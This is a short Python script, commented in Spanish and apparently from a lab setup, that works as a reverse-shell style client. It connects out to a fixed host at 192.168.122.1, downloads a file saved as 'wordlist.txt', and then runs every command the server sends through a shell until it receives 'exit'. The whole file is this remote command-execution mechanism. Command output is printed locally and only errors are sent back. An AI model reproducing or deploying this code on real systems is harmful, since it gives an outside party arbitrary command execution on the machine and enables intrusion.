import socket
import subprocess

HOST = "192.168.122.1"
PORT = int(input("Establece el puerto a usar: "))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# Recibir y guardar el archivo
with open('wordlist.txt', 'wb') as file:
    while True:
        data = s.recv(1024)
        if data == b"FINISHED" or not data:
            break
        file.write(data)

print("Archivo creado")

# Recibir el comando
while True:
    command = s.recv(1024).decode('utf-8')

    if command == 'exit':
        print("El servidor ha enviado el comando 'exit'. Cerrando conexión.")
        s.close()
        break
    else:
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT) # Ejecutar el comando
            print(output.decode('utf-8'))
        except Exception as q:
            print(f"Error al ejecutar el comando: {q}")
            s.sendall(b"Error al ejecutar el comando.")